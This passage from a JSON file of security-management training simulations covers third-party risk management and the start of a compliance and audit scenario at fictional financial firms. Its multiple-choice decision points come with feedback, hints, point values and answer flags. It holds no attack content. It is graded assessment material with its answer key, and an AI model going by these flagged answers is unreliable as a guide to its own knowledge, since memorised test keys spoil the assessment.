            "feedback": "{'short': \"Annual assessment doesn't influence daily decisions\", 'detailed': \"Annual assessment is a point-in-time snapshot, not operational integration. Decisions are made daily - new projects, vendor selections, process changes. If risk isn't considered in those decisions, the assessment is academic, not operational.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Risk assessment gates in project management, vendor selection, and change management",
            "feedback": "{'short': 'Correct! Embed risk checkpoints in operational processes', 'detailed': 'Operational integration: risk assessment required for new projects (is risk acceptable?), vendor selection (third-party risk evaluation), change management (what risks does change introduce?), and strategic planning (risk considerations in strategy). This ensures risk is considered when decisions are made, not just documented afterward.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Security team reviews all business decisions",
            "feedback": "{'short': \"Security can't review everything - need process integration\", 'detailed': \"Security team can't be involved in every decision - it creates bottlenecks and doesn't scale. Better to embed risk considerations in processes (checklists, criteria, escalation triggers) that business units follow, with security involvement for high-risk decisions.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Include risk section in monthly business reviews",
            "feedback": "{'short': \"Reporting doesn't equal integration into decisions\", 'detailed': \"Monthly risk reporting provides visibility but doesn't ensure risk is considered when decisions are made. Decisions happen between monthly reviews. Integration means risk checkpoints in decision processes, not just periodic reporting.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How do you ensure risk is considered when business decisions are made?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Embed risk checkpoints in processes: project approval, vendor selection, change management. Risk becomes part of how decisions are made, not just documented afterward."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D5-SIM-003",
    "title": "Third-Party Risk Management",
    "domain": 5,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": "40-50 minutes",
    "role": "Third-Party Risk Manager",
    "organization": {
      "name": "Meridian Financial Services",
      "industry": "Financial Services (Wealth Management)"
    },
    "introduction": "Meridian Financial Services relies heavily on third parties - from cloud providers hosting client portfolios to fintech partners enabling trading capabilities. A recent breach at a marketing vendor exposed client contact information, triggering regulatory inquiries and client complaints. The board wants answers: How many vendors have access to sensitive data? What's their security posture? How would we know if they were breached? Jennifer Walsh has tasked you with building a third-party risk management program that answers these questions and prevents future incidents.",
    "learning_objectives": [
      "Explain the processes associated with third-party risk assessment and management",
      "Explain elements of the risk management process"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Vendor Prioritization",
        "situation": "With 380 vendors, you can't assess them all at once. Resources allow thorough assessment of about 60 vendors per year. Some stakeholders want to start with the largest contracts; others want to focus on vendors with data access.\n\n**Question:** How should vendors be prioritized for assessment?",
        "options": [
          {
            "id": "A",
            "text": "By contract value - largest spend first",
            "feedback": "{'short': \"Contract value doesn't indicate security risk\", 'detailed': 'A high-value facilities contract may pose minimal security risk while a low-cost marketing SaaS may have all your client data. Prioritize by risk factors (data access, criticality), not financial spend.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Risk-based tiering using data sensitivity and system criticality",
            "feedback": "{'short': 'Correct! Risk-based prioritization focuses resources where risk is highest', 'detailed': 'Risk-based tiering: assess data sensitivity, system criticality, access level, and replaceability. Tier 1 (critical) vendors assessed first and most thoroughly. This ensures limited assessment resources address highest risks. Start with the 42 vendors who access client data or critical systems.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Alphabetically for fairness and completeness",
            "feedback": "{'short': 'Ignores risk entirely', 'detailed': 'Alphabetical ordering treats all vendors equally regardless of risk. A critical trading platform and an office supply vendor get the same treatment. Risk-based prioritization is fundamental to effective third-party risk management.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Newest vendors first - they're unknown quantities",
            "feedback": "{'short': \"Recency doesn't indicate risk level\", 'detailed': \"New vendors should be assessed before onboarding, but existing high-risk vendors may pose more immediate concern. A 10-year relationship with a critical data processor that's never been assessed is higher priority than a new low-risk vendor.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What factors indicate which vendors pose the greatest security risk?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Risk-based tiering: data sensitivity, system criticality, access level. Focus assessment resources on highest-risk vendors first."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Assessment Approach",
        "situation": "For critical (Tier 1) vendors, you need robust assessments. Some vendors resist detailed questionnaires and won't allow on-site visits. They offer SOC 2 reports and security certifications instead.\n\n**Question:** What assessment approach is MOST effective for critical vendors?",
        "options": [
          {
            "id": "A",
            "text": "Require on-site assessments for all critical vendors",
            "feedback": "{'short': 'Impractical and vendors may refuse', 'detailed': \"On-site assessments are valuable but: large vendors rarely allow customer audits, you can't visit all critical vendors annually, and on-site visits are expensive. SOC 2 Type II with supplemental questionnaire often provides better coverage.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Accept any security certification as sufficient",
            "feedback": "{'short': 'Not all certifications are equal or relevant', 'detailed': 'Certifications vary widely in rigor and scope. A SOC 2 Type II is more rigorous than a self-certified compliance statement. Even good certifications may not cover the specific services you use. Evaluate certification scope and relevance.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Combination: SOC 2 Type II review, targeted questionnaire, and security rating monitoring",
            "feedback": "{'short': 'Correct! Multi-faceted assessment provides comprehensive view', 'detailed': 'Layered assessment: SOC 2 Type II (independent audit of controls), targeted questionnaire (address your specific concerns and use case), security ratings (continuous outside-in monitoring), and documentation review (policies, incident response). This provides comprehensive assurance without requiring impractical on-site visits.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Rely solely on vendor self-attestation questionnaires",
            "feedback": "{'short': 'Self-reported data lacks independent verification', 'detailed': 'Questionnaires are valuable but self-reported. Vendors may overstate their security. Independent verification (SOC 2, penetration tests, security ratings) provides assurance that what vendors claim is accurate.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How do you get assurance about vendor security when you can't directly inspect?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Multi-layered approach: independent audit (SOC 2), targeted questionnaire, continuous monitoring (security ratings). Each method has strengths; combined they provide comprehensive assurance."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Contract Requirements",
        "situation": "You're negotiating with a new critical vendor. They resist including specific security requirements, saying 'our SOC 2 proves we're secure.' Procurement wants to close the deal quickly. Legal asks what security terms are essential.\n\n**Question:** What contract security requirements are ESSENTIAL for a critical vendor?",
        "options": [
          {
            "id": "A",
            "text": "Just reference their SOC 2 compliance",
            "feedback": "{'short': \"SOC 2 doesn't cover everything you need\", 'detailed': \"SOC 2 doesn't address: incident notification requirements, your right to audit, data handling at termination, subcontractor requirements, or specific compliance needs. You need contractual commitments beyond their existing certifications.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Security standards, incident notification, right to audit, data handling, and subcontractor requirements",
            "feedback": "{'short': 'Correct! These clauses provide necessary protections and oversight', 'detailed': 'Essential contract terms: security standards (baseline they must maintain), incident notification (timely notification of breaches), right to audit (ability to verify compliance), data handling (protection requirements and termination procedures), and subcontractor flow-down (their vendors meet same standards). These create accountability beyond certifications.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Comprehensive 50-page security exhibit covering all possible scenarios",
            "feedback": "{'short': 'Excessive requirements may delay or prevent deal', 'detailed': 'Overly detailed requirements may be rejected by vendors and delay critical services. Focus on essential requirements that create accountability and oversight. Additional controls can be addressed in ongoing vendor management.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Indemnification clause is sufficient",
            "feedback": "{'short': \"Indemnification doesn't prevent incidents\", 'detailed': \"Indemnification provides financial recovery after incidents but doesn't prevent them or ensure you're notified. You need proactive requirements (security standards, notification) not just reactive remedies (indemnification).\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What contract terms create vendor accountability and enable oversight?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Essential: security standards (what they maintain), incident notification (timely alerts), right to audit (verification), data handling (lifecycle), subcontractor requirements (fourth-party risk)."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "SOC 2 Report Review",
        "situation": "A critical vendor provides their SOC 2 Type II report. You notice: the report covers 'Security' trust criteria only, there are three control exceptions noted, and one subservice organization is 'carved out' of the scope.\n\n**Question:** What is the MOST significant concern with this SOC 2 report?",
        "options": [
          {
            "id": "A",
            "text": "Only Security criteria is covered - should include all five",
            "feedback": "{'short': 'Security is required; others depend on use case', 'detailed': \"Security is the core criterion and required for all SOC 2. Other criteria (availability, processing integrity, confidentiality, privacy) are optional and depend on the service. For data processing, you'd want confidentiality; for transaction processing, processing integrity. Not necessarily all five.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Three control exceptions - the auditor found problems",
            "feedback": "{'short': 'Exceptions need review but may not be disqualifying', 'detailed': \"Exceptions indicate control failures but need context. Were they in critical areas? What's the remediation status? A few minor exceptions in a large report may be acceptable. The carved-out subservice organization is potentially more concerning as it may hide significant risk.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Subservice organization carve-out - critical functions may be unaudited",
            "feedback": "{'short': 'Correct! Carve-outs can hide significant fourth-party risk', 'detailed': \"Carved-out subservice organizations mean those functions weren't audited. If the carve-out covers where your data is processed or stored (like their cloud infrastructure), you have a significant gap in assurance. You need to either get the subservice organization's SOC 2 or accept unaudited risk. This is often the most significant gap in SOC 2 reports.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "It's Type II - should request Type I instead",
            "feedback": "{'short': 'Type II is more rigorous than Type I', 'detailed': 'Type II is better - it covers operating effectiveness over a period, not just design at a point in time. Type I only confirms controls exist; Type II confirms they work. Always prefer Type II when available.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What could be excluded from the audit scope that might affect your data?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Subservice carve-outs exclude fourth parties (like cloud providers) from the audit. If your data is there, you have a gap in assurance."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Vendor Incident Response",
        "situation": "The marketing vendor confirms that client data was accessed during their ransomware attack. They're still investigating but believe approximately 125,000 client records were exposed. Your contracts require notification within 72 hours; they notified at 72 hours.\n\n**Question:** What is the MOST important immediate action?",
        "options": [
          {
            "id": "A",
            "text": "Terminate the vendor relationship immediately",
            "feedback": "{'short': 'Termination before understanding full situation is premature', 'detailed': \"Immediate termination may be warranted eventually, but right now you need the vendor's cooperation for investigation, may need their systems for data recovery, and hasty termination could harm your legal position. Assess first, then decide on relationship.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Determine exact data compromised and assess notification obligations",
            "feedback": "{'short': 'Correct! Understand scope to determine your obligations', 'detailed': \"Immediate priority: work with vendor to determine exactly what data was compromised (not just accessed), then assess your notification obligations to regulators, clients, and others. You can't make good decisions about notification, communication, or vendor relationship without knowing the scope. Investigation drives all other actions.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Notify all 125,000 clients immediately",
            "feedback": "{'short': 'Premature notification may cause unnecessary alarm', 'detailed': \"Notification may be required, but: 'approximately 125,000' isn't precise enough, you don't know exactly what was exposed, and breach notification laws have specific requirements about content. Premature or inaccurate notification can increase harm and legal exposure.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Wait for vendor's final forensic report",
            "feedback": "{'short': \"Forensics can take weeks - you can't wait\", 'detailed': \"Final forensics may take weeks or months. You have regulatory and client notification obligations that can't wait indefinitely. Work with vendor's ongoing investigation to get sufficient information for decision-making, even if not final.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What do you need to know before you can determine your notification obligations?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Scope determination: exactly what data, exactly which clients, actual vs. potential exposure. This drives notification obligations, client communication, and vendor relationship decisions."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "Ongoing Monitoring",
        "situation": "Assessments are complete for critical vendors. The CRO asks 'How do we know if a vendor's security degrades between annual assessments?' You need continuous visibility without overwhelming resources.\n\n**Question:** What ongoing monitoring approach is MOST effective?",
        "options": [
          {
            "id": "A",
            "text": "Quarterly reassessments of all critical vendors",
            "feedback": "{'short': 'Too resource-intensive and may not catch issues between quarters', 'detailed': 'Quarterly reassessments consume significant resources and still leave 3-month gaps. A vendor could be breached a day after assessment. Continuous monitoring provides better visibility with less effort than frequent reassessments.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Third-party security ratings with alert thresholds plus periodic reviews",
            "feedback": "{'short': 'Correct! Continuous monitoring with appropriate follow-up', 'detailed': 'Effective monitoring: security rating services provide continuous outside-in monitoring, alert when ratings drop, trigger review when thresholds exceeded. Combine with periodic reviews (quarterly for Tier 1, semi-annual for Tier 2), compliance certificate tracking, and news monitoring. This provides continuous visibility without overwhelming resources.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Rely on vendors to notify us of any security changes",
            "feedback": "{'short': 'Vendors may not know or disclose issues', 'detailed': \"Vendors may not detect their own issues, may downplay problems, or may have breach notification delays. Independent monitoring provides visibility you can't get from vendor self-reporting alone.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Monitor security news for vendor breach announcements",
            "feedback": "{'short': 'News monitoring is reactive and may miss issues', 'detailed': 'News monitoring is valuable but: only catches public incidents, misses unpublicized issues, and is reactive. Security ratings provide proactive indicators of degrading security before incidents become news.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How can you get continuous visibility into vendor security without constant assessment?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Security rating services (BitSight, SecurityScorecard): continuous monitoring, alert on changes, supplement with periodic reviews and news monitoring."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Fourth-Party Risk",
        "situation": "Your critical cloud vendor uses multiple subcontractors for data center services, security monitoring, and support. You're concerned about risks from these 'fourth parties' that you have no direct relationship with.\n\n**Question:** How should fourth-party (subcontractor) risk be managed?",
        "options": [
          {
            "id": "A",
            "text": "Require direct contracts with all fourth parties",
            "feedback": "{'short': \"Impractical - fourth parties won't contract with you\", 'detailed': \"Fourth parties have relationships with your vendor, not you. They won't enter contracts with you, and your vendor may not allow it. You must manage fourth-party risk through your vendor relationship, not direct relationships.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Contractual flow-down requirements and subcontractor disclosure",
            "feedback": "{'short': 'Correct! Manage fourth-party risk through your vendor', 'detailed': 'Fourth-party risk management: contractual requirements that vendor ensures subcontractors meet security standards (flow-down), disclosure of critical subcontractors, notification of subcontractor changes, and vendor accountability for subcontractor performance. You manage fourth parties through your vendor, not directly.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Accept that fourth-party risk is beyond your control",
            "feedback": "{'short': 'Fourth-party risk is real and can be managed', 'detailed': \"Fourth-party risk has caused major incidents (e.g., Target breach through HVAC vendor). While you can't control fourth parties directly, you can require your vendors to ensure their subcontractors meet standards. Acceptance without mitigation isn't appropriate for critical vendors.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Only use vendors with no subcontractors",
            "feedback": "{'short': 'Virtually impossible in modern IT', 'detailed': 'Almost every vendor uses subcontractors - cloud providers, data centers, security services. Excluding all vendors with subcontractors would eliminate most options. Manage the risk rather than trying to avoid it entirely.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How do you manage risk from parties you have no direct relationship with?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Through your vendor: contractual flow-down requirements (subcontractors must meet standards), subcontractor disclosure, notification of changes. Your vendor is accountable for their supply chain."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Vendor Offboarding",
        "situation": "After the marketing vendor breach, leadership decides to terminate the relationship. The vendor has client data and is integrated with several systems. What needs to happen to securely end this relationship?\n\n**Question:** What is the MOST critical security action in vendor offboarding?",
        "options": [
          {
            "id": "A",
            "text": "Send termination notice per contract terms",
            "feedback": "{'short': 'Legal step but not the critical security action', 'detailed': \"Termination notice is a legal requirement but doesn't address security. The vendor still has your data and potentially your credentials. Security actions must accompany or precede the legal termination.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Ensure all data is returned or destroyed, revoke all access, and verify",
            "feedback": "{'short': 'Correct! Secure data and access, then verify', 'detailed': \"Critical offboarding actions: revoke all vendor access (credentials, API keys, network access) immediately, migrate any needed data before termination, require data return and certified destruction of data vendor holds, verify destruction (don't just trust vendor attestation), and update monitoring for unauthorized access attempts. Data and access are the security priorities.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Document lessons learned from the incident",
            "feedback": "{'short': 'Important but not the critical security action during offboarding', 'detailed': 'Lessons learned are valuable and should happen, but during active offboarding, the priority is securing data and access. Document lessons after the immediate security actions are complete.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Find a replacement vendor first",
            "feedback": "{'short': 'Replacement is business continuity, not security priority', 'detailed': \"Finding a replacement is important for business continuity but doesn't address the security risk of data at the terminating vendor. Secure the data and access; replacement can proceed in parallel but isn't the security priority.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What security risks exist when ending a vendor relationship?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Vendor has your data and access credentials. Priorities: revoke access, secure/destroy data, verify. These eliminate ongoing risk from terminated relationship."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Program Metrics",
        "situation": "The board wants evidence that the third-party risk program is working. They ask 'How do we know our vendors are secure?' What metrics demonstrate program effectiveness?\n\n**Question:** What metrics BEST demonstrate third-party risk program effectiveness?",
        "options": [
          {
            "id": "A",
            "text": "Number of vendor assessments completed",
            "feedback": "{'short': \"Activity metric - doesn't show risk reduction\", 'detailed': \"Assessment count measures activity, not outcomes. 100 assessments that found problems but weren't remediated doesn't improve security. Show outcomes: are vendors actually secure? Are risks being addressed?\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Assessment coverage, finding remediation rates, security rating trends, and incident count",
            "feedback": "{'short': 'Correct! Outcome metrics showing risk posture and improvement', 'detailed': 'Effective TPRM metrics: assessment coverage (% of vendors assessed per tier requirements), finding remediation (are issues being fixed?), security rating trends (are vendors improving?), incident count (vendor-related breaches), and contract compliance (% with required security terms). These show whether the program actually reduces risk.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Cost savings from vendor negotiations",
            "feedback": "{'short': 'Financial metric, not risk metric', 'detailed': \"Cost savings from negotiations may be valuable but doesn't indicate security. A cheap vendor with poor security isn't a good outcome. TPRM should be measured on risk reduction, not cost savings.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Number of vendors with SOC 2 certifications",
            "feedback": "{'short': \"Certification count alone isn't sufficient\", 'detailed': 'SOC 2 is valuable but: a vendor can have SOC 2 and still have exceptions or gaps for your use case. Better to show assessment coverage plus finding remediation plus security trends - comprehensive view of vendor security posture.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What shows that vendor security is actually improving, not just that assessments happen?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Outcome metrics: coverage (assessed per requirements), remediation (findings fixed), trends (security improving), incidents (vendor breaches down). Show risk reduction, not just activity."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "Concentration Risk",
        "situation": "Analysis reveals that 78% of critical business applications run on one cloud provider (AWS). While AWS is highly secure, leadership is concerned about concentration risk - 'What if AWS has a major outage or we need to leave quickly?'\n\n**Question:** How should cloud concentration risk be addressed?",
        "options": [
          {
            "id": "A",
            "text": "Immediately migrate half of workloads to another provider",
            "feedback": "{'short': 'Costly, risky, and may not be necessary', 'detailed': \"Immediate migration is expensive, introduces migration risk, and may not address the actual concern. Concentration risk can be managed through other means - understanding the risk, contingency planning, and architectural decisions doesn't require immediate multi-cloud.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Accept the concentration as necessary for efficiency",
            "feedback": "{'short': \"Doesn't address legitimate concern\", 'detailed': \"Concentration with AWS provides benefits, but the board's concern is valid - a major AWS issue would be catastrophic. Don't just accept the risk; understand it, plan for contingencies, and make informed decisions about acceptable concentration levels.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Document the risk, assess exit capabilities, and develop contingency plans",
            "feedback": "{'short': 'Correct! Understand and plan for concentration risk', 'detailed': \"Managing concentration risk: document the concentration and implications, assess exit capabilities (can we migrate? how long? what's the cost?), develop contingency plans for major outage scenarios, consider architectural decisions that reduce lock-in (portable workloads), and make informed decisions about acceptable concentration. Full multi-cloud isn't always necessary, but informed planning is essential.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Require AWS to guarantee 100% uptime in contract",
            "feedback": "{'short': 'No provider will guarantee 100% uptime', 'detailed': \"100% uptime guarantees don't exist - even AWS has had outages. Contractual SLAs provide financial remedies but don't prevent outages. Managing concentration risk requires planning and architectural decisions, not just contracts.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What can you do about concentration risk without immediate expensive migration?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Understand and plan: document concentration, assess exit capabilities, develop contingency plans. Make informed decisions about acceptable concentration levels."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D5-SIM-004",
    "title": "Compliance and Audit Management",
    "domain": 5,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": 50,
    "role": "Security Compliance Manager",
    "organization": {
      "name": "Apex Financial Services",
      "industry": "Financial Services",
      "size": "Regional bank with 45 branches, 2,200 employees, $8B in assets",
      "environment": "Multi-regulatory environment including OCC (primary regulator), FDIC, state banking regulators, PCI DSS for card processing, SOX for financial reporting, and GLBA for customer privacy. Recently launched mobile banking and partnered with fintechs.",
      "current_state": "Passed most recent OCC examination but received Matters Requiring Attention (MRAs) for third-party risk management and IT risk assessment. Annual SOX audit approaching. PCI assessment due in 4 months. Internal audit identified gaps in evidence collection and control documentation."
    },
    "introduction": "You've joined Apex Financial Services as Security Compliance Manager during a challenging compliance period. Multiple regulatory frameworks overlap with different requirements, timelines, and evidence needs. Internal audit has flagged documentation gaps, and regulatory examiners are increasing scrutiny on cybersecurity. You must build a sustainable compliance program that satisfies multiple frameworks efficiently while maintaining continuous compliance rather than scrambling before each audit.",
    "learning_objectives": [
      "Understand different types of compliance requirements and their implications",
      "Design efficient compliance programs that address multiple frameworks",
      "Prepare for and manage regulatory examinations and audits",
      "Implement continuous compliance monitoring versus point-in-time assessments",
      "Handle audit findings and develop effective remediation plans"
    ],
    "decision_points": [
      {
        "id": "dp1",
        "sequence": 1,
        "title": "Compliance Landscape Assessment",
        "situation": "Your first task is understanding Apex's compliance obligations. You've mapped the following:\n\n**Regulatory Examinations:**\n- OCC: Annual IT examination (6 months away)\n- State regulators: Periodic examinations (timing varies)\n- FDIC: Backup examination authority\n\n**Required Certifications/Attestations:**\n- PCI DSS: Annual assessment + quarterly scans (assessment due in 4 months)\n- SOX 404: Annual controls testing (audit in 3 months)\n- SOC 2: Type II report for wealth management platform (requested by institutional clients)\n\n**Privacy Requirements:**\n- GLBA: Safeguards Rule compliance\n- State privacy laws: Various requirements across operating states\n\nHow do you approach organizing this compliance landscape?",
        "options": [
          {
            "id": "a",
            "text": "Address each framework separately with dedicated compliance tracks",
            "feedback": "Siloed compliance creates duplication and inefficiency. Many controls satisfy multiple frameworks - access controls, encryption, logging. Separate tracks mean demonstrating the same control multiple times with different evidence, wasting resources and creating inconsistency risk.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Siloed compliance programs are inefficient. Modern compliance management maps controls to multiple frameworks.",
            "consequences": {
              "immediate": "Clear ownership but massive duplication",
              "security_impact": "Controls may be implemented inconsistently across frameworks",
              "business_impact": "Expensive compliance program; audit fatigue for control owners"
            }
          },
          {
            "id": "b",
            "text": "Create unified control framework mapped to all requirements, with single evidence collection serving multiple audits",
            "feedback": "Excellent approach. A unified control framework identifies common requirements across regulations. One access control implementation satisfies OCC, PCI, SOX, and GLBA simultaneously. Evidence collected once serves multiple audits. This reduces burden on control owners and ensures consistency.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Control framework rationalization maps organizational controls to multiple compliance requirements, reducing duplication while ensuring comprehensive coverage.",
            "consequences": {
              "immediate": "Upfront mapping effort but long-term efficiency",
              "security_impact": "Consistent controls across all frameworks",
              "business_impact": "Reduced audit fatigue; efficient resource use"
            }
          },
          {
            "id": "c",
            "text": "Focus on regulatory examinations first since they carry enforcement authority; certifications are secondary",
            "feedback": "Prioritizing regulators over certifications ignores business requirements. PCI non-compliance can result in card processing loss - existential for a bank. SOC 2 affects client relationships. All compliance obligations matter; the solution is efficiency, not prioritization that creates gaps.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Compliance programs must address all applicable requirements. Business-driven requirements (PCI, SOC 2) can have consequences as severe as regulatory failures.",
            "consequences": {
              "immediate": "Regulatory focus but certification gaps",
              "security_impact": "Controls optimized for regulators may miss PCI/SOX specifics",
              "business_impact": "PCI failure affects card processing; SOX issues affect financial reporting"
            }
          },
          {
            "id": "d",
            "text": "Adopt an industry framework like NIST CSF as the baseline and map regulations to it",
            "feedback": "Using an industry framework as a baseline is helpful but incomplete. NIST CSF doesn't include all specific requirements from PCI, SOX, or banking regulations. The framework provides structure, but you still need explicit mapping to each compliance requirement to ensure nothing is missed.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Industry frameworks provide excellent structure but must be augmented with explicit mapping to specific regulatory requirements.",
            "consequences": {
              "immediate": "Good structure but potential gaps in specific requirements",
              "security_impact": "May miss prescriptive requirements not in framework",
              "business_impact": "Audit findings for requirements framework doesn't address"
            }
          }
        ],
        "hints": [
          "Think about how much overlap exists between these different requirements",
          "Consider the burden on control owners who must provide evidence repeatedly"
        ]
      },
      {
        "id": "dp2",
        "sequence": 2,
        "title": "Evidence Management Strategy",
        "situation": "Internal audit flagged that evidence collection is ad-hoc: teams scramble before each audit, evidence is stored in various locations, and documentation often can't be located when needed. Last year's PCI assessment was delayed because firewall rule evidence couldn't be found.\n\nThe CIO asks: 'How do we fix this evidence problem? Auditors keep asking for things we know we have but can't find.'\n\nWhat evidence management approach do you recommend?",
        "options": [
          {
            "id": "a",
            "text": "Create shared folders for each compliance framework where teams store evidence before audits",
            "feedback": "Shared folders are better than nothing but create the same problems at larger scale: inconsistent organization, version control issues, evidence spread across locations. Pre-audit scrambles continue because evidence isn't maintained continuously. This addresses storage but not process.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Evidence management requires more than storage - it needs process, standards, and continuous maintenance.",
            "consequences": {
              "immediate": "Slightly more organized chaos",
              "security_impact": "Evidence quality and completeness still inconsistent",
              "business_impact": "Audit preparation still stressful and time-consuming"
            }
          },
          {
